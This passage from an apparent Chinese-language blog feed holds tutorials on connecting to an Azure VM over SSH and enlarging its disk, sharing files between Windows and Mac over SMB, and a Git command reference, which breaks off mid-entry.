src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200812143323.png" alt=""></p><p>点击第一个搜索结果。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200812143437.png" alt=""></p><p>点击添加。</p><p>配置IP 基本信息，然后点击创建。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200812143641.png" alt=""></p><p>此时，只是创建了内网IP，并没有与外网IP 地址进行关联，</p><p>点击刚才新建的公共 IP 地址，点击配置。</p><p>资源类型选择网络接口，网络接口与对应的实例进行关联。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200812153504.png" alt=""></p><p>关联成功之后，就可以进行连接了。</p><h3 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h3><ol><li>打开终端</li><li>请确保你对私钥具有只读访问权限。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 400 &lt;私钥&gt;</span><br></pre></td></tr></table></figure><ol start="3"><li>运行以下示例命令以连接到 VM。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i &lt;私钥路径&gt; user@ip_address</span><br></pre></td></tr></table></figure><ul><li><code>user</code>：表示VM 用户</li><li><code>ip_address</code>：表示外网IP 地址</li></ul><h3 id="扩大默认磁盘大小"><a href="#扩大默认磁盘大小" class="headerlink" title="扩大默认磁盘大小"></a>扩大默认磁盘大小</h3><p>上面简单提到过，如果想要扩大默认磁盘的大小，有两种方式：</p><ol><li>添加新磁盘。这种方式需要手动挂载，如果对linux 并不熟悉，这种方式不推荐新手用户使用。</li><li>更改默认磁盘大小。</li></ol><p>第二种方式并不能直接更改，需要先将服务器停掉（注意⚠️：不是删除）。</p><p>搜索磁盘，点击第一个搜索结果。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200812145110.png" alt=""></p><p>点击需要扩大的磁盘实例，注意：只能扩大，不能缩小。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200812145326.png" alt=""></p><p>然后点击保存即可。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>至此，就已经完成了Azure 的创建了，这方面需要学习的还有很多，这里只是简单的整理了一下自己遇到的问题。</p><p>有些地方可能没说清楚，但如果能帮到你那真是太好了</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> Tutorial </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tutorial </tag>
            
            <tag> Linux </tag>
            
            <tag> 云 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows 和 Mac 在局域网内如何共享文件？</title>
      <link href="/how-do-windows-and-mac-share-files-in-the-local-area-network/"/>
      <url>/how-do-windows-and-mac-share-files-in-the-local-area-network/</url>
      
        <content type="html"><![CDATA[<p>每当手上有两台或多台电脑时，如果想传送一个文件，第一个想到的就是微信、QQ等这类工具。<br>如果碰到了大一点的文件，就得换成网盘或者移动硬盘。</p><p>身为一个做开发者，这种做法比较low，所以找了几篇文章学习到了如何在局域网内共享文件。</p><a id="more"></a><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>这里准备的是用 Windows 作为主机创建共享文件。</p><p>首先要确认准备传输文件的 Windows 和 Mac 是在同一个路由器组成的局域网内。</p><p>然后打开 Windows 的文件资源管理器，在其根目录下创建一个共享文件夹，名称随意，自己知道就好了。</p><p>右键文件夹，点击属性，找到 共享 Tab，点击高级共享。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200811220638.png" alt=""></p><p>勾选共享此文件夹，点击确定。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200811220726.png" alt=""></p><p>然后回到共享文件夹，右键点击属性，找到共享，选择用户。</p><p>如果允许其他人写入，则选择 Everyone，更改为：读取/写入。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200811220755.png" alt=""></p><h2 id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h2><h3 id="Windows-本机访问"><a href="#Windows-本机访问" class="headerlink" title="Windows 本机访问"></a>Windows 本机访问</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># ComputerName 表示：你的计算机名称</span><br><span class="line"># ShareFolders 表示：共享文件夹名称</span><br><span class="line">file:&#x2F;&#x2F;ComputerName&#x2F;ShareFolders&#x2F;</span><br></pre></td></tr></table></figure><h3 id="Mac-局域网访问"><a href="#Mac-局域网访问" class="headerlink" title="Mac 局域网访问"></a>Mac 局域网访问</h3><p>Mac 有两种方式：</p><ol><li>通过浏览器访问</li><li>通过访达访问，使用快捷键 <code>⌘ + k</code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># ComputerName 表示：需要访问的计算机名称</span><br><span class="line"># ShareFolders 表示：共享文件夹名称</span><br><span class="line">smb:&#x2F;&#x2F;ConputerName&#x2F;ShareFolders&#x2F;</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200811220823.png" alt=""></li></ol><p>通过验证之后，就能访问到共享文件夹了。</p><p>到这里应该就能顺利的在两个或多个电脑之间传输文件了。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200811220855.png" alt=""></p><p>如果还不能访问，可以ping 一下对方的主机，如果没有ping通，检查一下防火墙设置。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200811220920.png" alt=""></p><p>如果防火墙关着，那么会 ping 不通。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200813193747.png" alt=""></p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://zhuanlan.zhihu.com/p/32026197" target="_blank" rel="noopener">Windows 和 Mac 在局域网内如何共享文件？</a></li><li><a href="https://blog.csdn.net/sscssz/article/details/50057759" target="_blank" rel="noopener">共享文件夹 一个实现Windows和Mac之间文件互传的简单方法</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Skill </category>
          
          <category> Windows </category>
          
          <category> Mac </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Skill </tag>
            
            <tag> Windows </tag>
            
            <tag> Mac </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git 常用命令参考手册</title>
      <link href="/git-common-command-reference-manual/"/>
      <url>/git-common-command-reference-manual/</url>
      
        <content type="html"><![CDATA[<p>虽然每天都在使用<code>Git</code>，但是有些命令太久不使用，还是会忘记，所以这篇笔记的目的就是整理那些<code>Git</code> 常用命令。</p><a id="more"></a><h2 id="基础配置"><a href="#基础配置" class="headerlink" title="基础配置"></a>基础配置</h2><p>Git的设置文件为<code>.gitconfig</code>，它可以在用户主目录下（全局配置），也可以在项目目录下（项目配置）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># 查看全局配置列表</span><br><span class="line">$ git config --global --list</span><br><span class="line"># 查看局部配置列表</span><br><span class="line">$ git config --local --list</span><br><span class="line"></span><br><span class="line"># 设置全局用户名&#x2F;邮箱</span><br><span class="line">$ git config --global user.name &quot;yourName&quot;</span><br><span class="line">$ git config --global user.email &quot;example@example.com&quot;</span><br><span class="line"></span><br><span class="line"># 设置本地当前工作区仓库用户名&#x2F;邮箱</span><br><span class="line">$ git config --local user.name &quot;yourName&quot;</span><br><span class="line">$ git config --local user.email &quot;example@example.com&quot;</span><br><span class="line"></span><br><span class="line"># 将默认文本编辑器设置为 emacs&#x2F;vim</span><br><span class="line">$ git config --global core.editor emacs&#x2F;vim</span><br><span class="line"></span><br><span class="line"># 编辑当前仓库的配置文件</span><br><span class="line">$ git config -e  # 等价与 vim .git&#x2F;config</span><br><span class="line"># 编辑全局配置文件</span><br><span class="line">$ git config --global -e</span><br></pre></td></tr></table></figure><h3 id="命令别名配置"><a href="#命令别名配置" class="headerlink" title="命令别名配置"></a>命令别名配置</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 添加别名 git st &#x3D; git status</span><br><span class="line">$ git config --global alias.st status</span><br><span class="line"></span><br><span class="line"># 删除 st 别名</span><br><span class="line">$ git config --global --unset alias.st</span><br><span class="line"></span><br><span class="line"># 执行外部命令, 只要在前面加 ! 即可</span><br><span class="line">$ git config --global alias.st &#39;!echo hello&#39;;</span><br></pre></td></tr></table></figure><h3 id="代理配置"><a href="#代理配置" class="headerlink" title="代理配置"></a>代理配置</h3><p>如果想知道关于<code>Git</code>配置代理的更多信息，可以查阅<a href="https://github.com/0xAiKang/Note/blob/master/Skill/Git%20Clone%20%E5%A4%AA%E6%85%A2%E6%80%8E%E4%B9%88%E5%8A%9E%EF%BC%9F.md" target="_blank" rel="noopener">这篇笔记</a>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 配置HTTP&#x2F;HTTPS 代理</span><br><span class="line">$ git config --global https.proxy  http:&#x2F;&#x2F;127.0.0.1:1087</span><br><span class="line">$ git config --global http.proxy  http:&#x2F;&#x2F;127.0.0.1:1087</span><br><span class="line"></span><br><span class="line"># 查看</span><br><span class="line">$ git config --global --get http.proxy</span><br><span class="line">$ git config --global --get https.proxy</span><br><span class="line"></span><br><span class="line"># 取消代理</span><br><span class="line">$ git config --global --unset http.proxy</span><br><span class="line">$ git config --global --unset https.proxy</span><br></pre></td></tr></table></figure><h3 id="生成SSHKey"><a href="#生成SSHKey" class="headerlink" title="生成SSHKey"></a>生成SSHKey</h3><p>关于如何配置<code>ssh config</code> 可以查阅<a href="https://github.com/0xAiKang/Note/blob/master/Git/%E9%80%9A%E8%BF%87SSH%20Config%20%E9%85%8D%E7%BD%AE%20Git%20SSH%20%E5%8D%8F%E8%AE%AE.md" target="_blank" rel="noopener">这篇笔记</a>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 将ssh key生成在默认下，也就是&#96;~&#x2F;.ssh&#x2F;id_rsa&#96;。</span><br><span class="line">$ ssh-keygen -t rsa -C &quot;youremail&quot;</span><br><span class="line"></span><br><span class="line"># 将ssh key生成在指定路径下的指定文件名中</span><br><span class="line">$ ssh-keygen -t rsa  -f ~&#x2F;.ssh&#x2F;id_rsa_bitbucket -C &quot;youremail&quot;</span><br></pre></td></tr></table></figure><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 在当前目录新建一个Git代码库</span><br><span class="line">$ git init</span><br><span class="line"></span><br><span class="line"># 新建一个目录，将其初始化为Git代码库</span><br><span class="line">$ git init [project-name]</span><br><span class="line"></span><br><span class="line"># 下载一个项目和它的整个代码历史</span><br><span class="line">$ git clone [url] [project-name]</span><br><span class="line"></span><br><span class="line"># 浅克隆, 历史记录只克隆最后一条, 减少克隆时间</span><br><span class="line">$ git clone --depth&#x3D;1 https:&#x2F;&#x2F;github.com&#x2F;0xAiKang&#x2F;Note.git</span><br></pre></td></tr></table></figure><h2 id="基础操作"><a href="#基础操作" class="headerlink" title="基础操作"></a>基础操作</h2><p>基础操作中的命令都是日常使用频率非常高的。</p><h3 id="文件状态"><a href="#文件状态" class="headerlink" title="文件状态"></a>文件状态</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 查看工作区状态</span><br><span class="line">$ git status</span><br><span class="line"></span><br><span class="line"># 列出没有被 .gitignore 忽略的文件列表</span><br><span class="line">$ git status --ignored</span><br><span class="line"></span><br><span class="line"># 列出没有被 .gitignore 忽略的文件列表</span><br><span class="line">$ git ls-files</span><br></pre></td></tr></table></figure><h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># 暂存所有</span><br><span class="line">$ git add -A</span><br><span class="line"></span><br><span class="line"># 暂存某个文件</span><br><span class="line">$ git add .&#x2F;README.md</span><br><span class="line"></span><br><span class="line"># 添加当前目录的所有文件到暂存区    </span><br><span class="line">$ git add .</span><br><span class="line"></span><br><span class="line"># 暂存一系列文件</span><br><span class="line">$ git add 1.txt 2.txt ...</span><br><span class="line"></span><br><span class="line"># 从暂存区中删除文件（git add 的反向操作）</span><br><span class="line">$ git rm [file] </span><br><span class="line"></span><br><span class="line"># 暂存区、工作区一起删除</span><br><span class="line">$ git rm -f [file]</span><br><span class="line"></span><br><span class="line"># 停止追踪指定文件，但该文件会保留在工作区</span><br><span class="line">$ git rm --cached [file]</span><br></pre></td></tr></table></figure><h3 id="查看文件改动"><a href="#查看文件改动" class="headerlink" title="查看文件改动"></a>查看文件改动</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># 查看所有文件改动</span><br><span class="line">$ git diff</span><br><span class="line"></span><br><span class="line"># 查看具体文件的改动</span><br><span class="line">$ git diff README.md</span><br><span class="line"></span><br><span class="line"># 查看指定 commit-id 改动内容</span><br><span class="line">$ git diff [commit-id]</span><br><span class="line"></span><br><span class="line"># 对比工作区和版本库里的最新版本有什么区别</span><br><span class="line">$ git diff HEAD --[file-name]</span><br><span class="line"></span><br><span class="line"># 查看某个文件的历史修改记录</span><br><span class="line">$ git log README.md</span><br><span class="line">$ git show [commit-id] README.md</span><br></pre></td></tr></table></figure><h3 id="撤销与回滚"><a href="#撤销与回滚" class="headerlink" title="撤销与回滚"></a>撤销与回滚</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 恢复暂存区的指定文件到工作区</span><br><span class="line">$ git checkout [file]</span><br><span class="line"></span><br><span class="line"># 恢复暂存区的所有文件到工作区</span><br><span class="line">$ git checkout .</span><br><span class="line"></span><br><span class="line"># 重置暂存区与工作区，与上一次commit保持一致</span><br><span class="line">$ git reset --hard</span><br><span class="line"></span><br><span class="line"># 回滚上一个版本</span><br><span class="line">$ git reset --hard HEAD^</span><br><span class="line"></span><br><span class="line"># 回退到指定版本（会重置暂存区与工作区）</span><br><span class="line">$ git reset --hard [commit-id]</span><br><span class="line"></span><br><span class="line"># 回退到指定版本（不会重置暂存区与工作区，会回到该版本的暂存状态）</span><br><span class="line">$ git reset --soft [commit-id]</span><br></pre></td></tr></table></figure><h3 id="提交"><a href="#提交" class="headerlink" title="提交"></a>提交</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 提交暂存区到本地仓库</span><br><span class="line">$ git commit -m [message]</span><br><span class="line"></span><br><span class="line"># 提交暂存区的指定文件到本地仓库</span><br><span class="line">git commit README.md -m [message]</span><br><span class="line"></span><br><span class="line"># 提交并显示diff变化</span><br><span class="line">git commit -v</span><br><span class="line"></span><br><span class="line"># 重写上一次的提交</span><br><span class="line"># 如果代码没有任何新变化，则用来改写上一次commit的提交信息</span><br><span class="line">$ git commit --amend -m [message]</span><br></pre></td></tr></table></figure><h3 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># 查看完整历史提交记录</span><br><span class="line">$ git log</span><br><span class="line"></span><br><span class="line"># 查看前n 条记录</span><br><span class="line">$ git log -n</span><br><span class="line"></span><br><span class="line"># 以图形方式查看完整历史提交记录</span><br><span class="line">$ git log --graph --pretty&#x3D;oneline --abbrev-commit</span><br><span class="line"></span><br><span class="line"># 通过commit log 进行搜索</span><br><span class="line">$ git log -i --grep&#x3D;&quot;fire bug&quot;</span><br><span class="line"></span><br><span class="line"># 列出提交者贡献数量, 只会打印作者和贡献数量</span><br><span class="line">$ git shortlog -sn</span><br><span class="line"></span><br><span class="line"># 以提交贡献数量排序并打印出信息</span><br><span class="line">$ git shortlog -n</span><br><span class="line"></span><br><span class="line"># 采用邮箱格式化的方式进行查看贡献度</span><br><span class="line">$ git shortlog -e</span><br></pre></td></tr></table></figure><h3 id="分支"><a href="#分支" class="headerlink" title="分支"></a>分支</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"># 查看本地分支</span><br><span class="line">git branch</span><br><span class="line"></span><br><span class="line"># 查看所有分支</span><br><span class="line">git branch -a</span><br><span class="line"></span><br><span class="line"># 查看本地分支所关联的远程分支</span><br><span class="line">git branch -vv</span><br><span class="line"></span><br><span class="line"># 查看本地 master 分支创建时间</span><br><span class="line">git reflog show --date&#x3D;iso master</span><br><span class="line"></span><br><span class="line"># 新建一个分支，但依然停留在当前分支</span><br><span class="line">$ git branch [branch-name]</span><br><span class="line"></span><br><span class="line"># 新建一个分支，并切换到该分支</span><br><span class="line">$ git checkout -b [branch]</span><br><span class="line"></span><br><span class="line"># 新建一个分支，指向指定commit</span><br><span class="line">$ git branch [branch] [commit-id]</span><br><span class="line"></span><br><span class="line"># 新建一个分支，与指定的远程分支建立追踪关系</span><br><span class="line">$ git branch --track [branch] [remote-branch]</span><br><span class="line"></span><br><span class="line"># 切换到指定分支，并更新工作区</span><br><span class="line">$ git checkout [branch-name]</span><br><span class="line"></span><br><span class="line"># 建立追踪关系，在现有分支与指定的远程分支之间</span><br><span class="line">$ git branch --set-upstream [branch] [remote-branch]</span><br><span class="line"></span><br><span class="line"># 合并指定分支到当前分支</span><br><span class="line">$ git merge [branch]</span><br><span class="line"></span><br><span class="line"># 选择一个commit，合并进当前分支</span><br><span class="line">$ git cherry-pick [commit-id]</span><br><span class="line"></span><br><span class="line"># 删除指定分支</span><br><span class="line">$ git branch -d [branch-name]</span><br><span class="line"></span><br><span class="line"># 强制删除指定分支</span><br><span class="line">$ git branch -D [branch-name]</span><br><span class="line"></span><br><span class="line"># 删除远程分支</span><br><span class="line">$ git push origin --delete [branch-name]</span><br><span class="line">$ git branch -dr [remote&#x2F;branch]</span><br></pre></td></tr></table></figure><h3 id="远程仓库管理"><a href="#远程仓库管理" class="headerlink" title="远程仓库管理"></a>远程仓库管理</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># 查看远程仓库（默认是origin，这是git 会使用的默认名称）</span><br><span class="line">$ git remote </span><br><span class="line"></span><br><span class="line"># 指定-v, 查看所有远程仓库地址</span><br><span class="line">$ git remote -v</span><br><span class="line"></span><br><span class="line"># 添加一个新的远程仓库</span><br><span class="line">$ git remote add [origin-name] https:&#x2F;&#x2F;github.com&#x2F;0xAiKang&#x2F;Note.git</span><br><span class="line"></span><br><span class="line"># 查看指定远程仓库的详情信息</span><br><span class="line">$ git remote show [origin-name]</span><br><span class="line"></span><br><span class="line"># 重命名远程仓库</span><br><span class="line">$ git remote rename [old-name] [new-name]</span><br><span class="line"></span><br><span class="line"># 移除远程仓库</span><br><span class="line">$ git remote remove [origin-name]</span><br><span class="line"></span><br><span class="line"># 修改源</span><br><span class="line">$ git remote set-url origin [NEW_URL]</span><br></pre></td></tr></table></figure><h3 id="Push"><a href="#Push" class="headerlink" title="Push"></a>Push</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 默认推送当前分支</span><br><span class="line">$ git push</span><br><span class="line"></span><br><span class="line"># 推送内容到主分支，并建立追踪关系</span><br><span class="line">$ git push -u origin master</span><br><span class="line"></span><br><span class="line"># 将本地分支推送到指定远程分支， （本地分支:远程分支）</span><br><span class="line">$ git push origin [branch]:[branch]</span><br><span class="line"></span><br><span class="line"># 强行推送当前分支到远程仓库，即使有冲突</span><br><span class="line">$ git push -f</span><br></pre></td></tr></table></figure><h3 id="Pull"><a href="#Pull" class="headerlink" title="Pull"></a>Pull</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 取回默认远程仓库的变化，并自动与本地分支合并</span><br><span class="line">$ git pull</span><br><span class="line"></span><br><span class="line"># 取回指定远程仓库的变化，并自动与本地指定分支合并（远程分支名:本地分支名）</span><br><span class="line">$ git pull [remote] [branch]:[branch]</span><br><span class="line"></span><br><span class="line"># 取回指定远程仓库的变化，并自动与本地当前分支合并</span><br><span class="line">$ git pull origin master</span><br><span class="line"></span><br><span class="line"># 取回远程仓库的所有变动，但是不会自动与本地当前分支合并</span><br><span class="line">$ git fetch</span><br></pre></td></tr></table></figure><h2 id="进阶操作"><a href="#进阶操作" class="headerlink" title="进阶操作"></a>进阶操作</h2><p>进阶操作中的命令是一些很实用，但可能不常使用，所以把它们单独拎出来。</p><h3 id="cherry-pick"><a href="#cherry-pick" class="headerlink" title="cherry-pick"></a>cherry-pick</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 选择一个commit，合并进当前分支</span><br><span class="line">$ git cherry-pick [commit-id]</span><br><span class="line"></span><br><span class="line"># 保留原有作者信息进行提交</span><br><span class="line">$ git cherry-pick -x [commit-id]</span><br></pre></td></tr></table></figure><h3 id="Stash"><a href="#Stash" class="headerlink" title="Stash"></a>Stash</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 将当前的工作区隐藏</span><br><span class="line">$ git stash</span><br><span class="line"></span><br><span class="line"># 恢复隐藏的工作区，并将此次隐藏记录从隐藏列表中移出</span><br><span class="line">$ git stash pop</span><br><span class="line"></span><br><span class="line"># 恢复隐藏的工作区，保留此次隐藏记录</span><br><span class="line">$ git stash apply</span><br><span class="line"></span><br><span class="line"># 查看当前隐藏列表</span><br><span class="line">$ git stash list</span><br></pre></td></tr></table></figure><h3 id="Blame"><a href="#Blame" class="headerlink" title="Blame"></a>Blame</h3><p><code>git blame</code> 用于查看某个文件的修改历史记录是哪个作者进行了改动。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 查看 README.md 文件的修改历史记录，包括时间、作者以及内容</span><br><span class="line">$ git blame README.md</span><br><span class="line"></span><br><span class="line"># 查看谁改动了 README.md 文件的 11行-12行</span><br><span class="line">$ git blame -L 11,12 README.md</span><br><span class="line"></span><br><span class="line"># 查看谁改动了 README.md 文件11行以后</span><br><span class="line">$ git blame -L 11 README.md</span><br></pre></td></tr></table></figure><h3 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"># 列出本地所有标签</span><br><span class="line">git tag</span><br><span class="line"></span><br><span class="line"># 新建一个tag在当前commit</span><br><span class="line">$ git tag [tag]</span><br><span class="line"></span><br><span class="line"># 新建一个tag在指定commit</span><br><span class="line">$ git tag [tag] [commit]</span><br><span class="line"></span><br><span class="line"># 删除本地tag</span><br><span class="line">$ git tag -d [tag]</span><br><span class="line"></span><br><span class="line"># 删除远程tag</span><br><span class="line">$ git push origin :refs&#x2F;tags&#x2F;[tagName]</span><br><span class="line"></span><br><span class="line"># 列出远程所有标签</span><br><span class="line">$ git ls-remote --tags 